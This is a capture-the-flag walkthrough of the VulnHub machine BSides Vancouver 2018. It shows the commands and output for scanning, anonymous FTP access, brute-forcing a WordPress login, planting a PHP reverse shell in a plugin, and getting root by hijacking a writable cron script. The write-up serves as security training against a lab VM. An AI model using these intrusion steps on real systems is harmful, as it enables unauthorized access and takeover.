---
title: VulnHub - BSides Vancouver 2018
author: ret2x
date: 2023-08-24 12:00:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, sqli, lfi, wordpress]
image:
    path: /assets/images/bsides/front.png
---

**Description:** A linux machine that requires a simple enumeration, perform a dictionry attack against the Wordpress login form, and edit a plugin to gain the initial shell. Insecure file permissions and a cron job allowed to get root privileges.

**Author:** abatchy

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/)

## Information Gathering

### Host Discovery

The following ping scan discovered the target server.

```console
root@parrot:~$ for n in $(seq 1 254); do ping -c 1 -W 1 192.168.142.$n 2>&1 >/dev/null && echo "Host 192.168.142.$n Up"; done
Host 192.168.142.130 Up
```

### Port Scanning

The full TCP port scan found three open ports.

```console
root@parrot:~$ nmap -n -v -p- -T4 -Pn 192.168.142.130 -oG nmap/port-scan.txt
...
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Service Enumeration

The aggressive scanning performed with nmap against the target revealed that the vsftpd service has enabled the anonymous login, and an instance of wordpress CMS appears on the web server.

```console
root@parrot:~$ nmap -n -v -p21,22,80 -A -Pn 192.168.142.130 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Mar 03  2018 public
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.142.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 859f8b5844973398ee98b0c185603c41 (DSA)
|   2048 cf1a04e17ba3cd2bd1af7db330e0a09d (RSA)
|_  256 97e5287a314d0a89b2b02581d536634c (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn\'t have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/backup_wordpress
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

### FTP Enumeration

With the following commands the remote FTP directory was mounted to the local file tree, and a backup file with users was found.

```console
root@parrot:~$ mkdir /mnt/ftp
root@parrot:~$ curlftpfs anonymous:@192.168.142.130 /mnt/ftp 
root@parrot:~$ ls /mnt/ftp/public 
users.txt.bk
root@parrot:~$ cp -r /mnt/ftp/public .
```

```console
root@parrot:~$ cat users.txt.bk 
abatchy
john
mai
anne
doomguy
```

### Web Enumeration

Browsing to **/backup_wordpress** directry, we access to an instance of Wordpress CMS.

![](/assets/images/bsides/screenshot-1.png)

By listing the users, only two can log in to Wordpress, thus filtering out the others.

```console
root@parrot:~$ for n in $(seq 1 10); do curl -s "http://192.168.142.130/backup_wordpress/?author=$n" | grep -i 'author:' | sed 's/.*d">\(.*\)<\/s.*/\1/'; done | tee wp-users.txt
admin
john
```

With the information obtained, a dictioray attack is carried out against the Wordpress log in form. I have written a python script to accomplish this work.

```console
root@parrot:~$ git clone https://github.com/ret2x-tools/wp-brute-force.git
```

John's password was found.

```console
root@parrot:~$ python WPbf.py -u http://192.168.142.130/backup_wordpress -L wp-users.txt -P /opt/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
Success => john:enigma
```

## Exploitation

Log in with the credentials found.

![](/assets/images/bsides/screenshot-2.png)

![](/assets/images/bsides/screenshot-3.png)

Since John has administrator privileges it is possible to edit a plugin to write a php reverse shell.

Select Plugins -> Editor, write a php reverse shell, in this case I have edited the **akismet** plugin, and click **Update File**.

![](/assets/images/bsides/screenshot-4.png)

Start a netcat listener on port 443, and perform a web request to the **akismet** plugin.

```console
root@parrot:~$ curl -s "http://192.168.142.130/backup_wordpress/wp-content/plugins/akismet/akismet.php"
```

```console
root@parrot:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.142.1] from (UNKNOWN) [192.168.142.130] 43587
bash: no job control in this shell
www-data@bsides2018:/var/www/backup_wordpress/wp-content/plugins/akismet$ script -qc /bin/bash /dev/null
<ent/plugins/akismet$ script -qc /bin/bash /dev/null                         
www-data@bsides2018:/var/www/backup_wordpress/wp-content/plugins/akismet$
```

By listing the SUID binaries, the **/usr/local/bin/cleanup** binary was found.

```console
www-data@bsides2018:/tmp$ find / -writable -type f 2>/dev/null | grep -v 'proc\|sys'
...
/usr/local/bin/cleanup
```

This is a bash script that removes the apache log files, which is executed every minute by a cron job, and the most important is that we have write permissions.

```console
www-data@bsides2018:/tmp$ cat /usr/local/bin/cleanup
#!/bin/sh

rm -rf /var/log/apache2/*	# Clean those damn logs!!
```

```console
www-data@bsides2018:/tmp$ tail -n 2 /etc/crontab
*  *    * * *   root    /usr/local/bin/cleanup
#
```

## Privilege Escalation

### Cron Job

The following command append to **/usr/local/bin/cleanup** file the instruction to run the **akismet** plugin every minute by the cron job.

```console
www-data@bsides2018:/tmp$ echo "php -f /var/www/backup_wordpress/wp-content/plugins/akismet/akismet.php" >> /usr/local/bin/cleanup
```

Start a netcat listenet on port 443 and wait every minute a root shell.

```console
root@parrot:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.142.1] from (UNKNOWN) [192.168.142.130] 43588
bash: no job control in this shell
root@bsides2018:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```console
root@bsides2018:~# cat flag.txt
cat flag.txt
Congratulations!

If you can read this, that means you were able to obtain root permissions on this VM.
You should be proud!

There are multiple ways to gain access remotely, as well as for privilege escalation.
Did you find them all?

@abatchy17
```
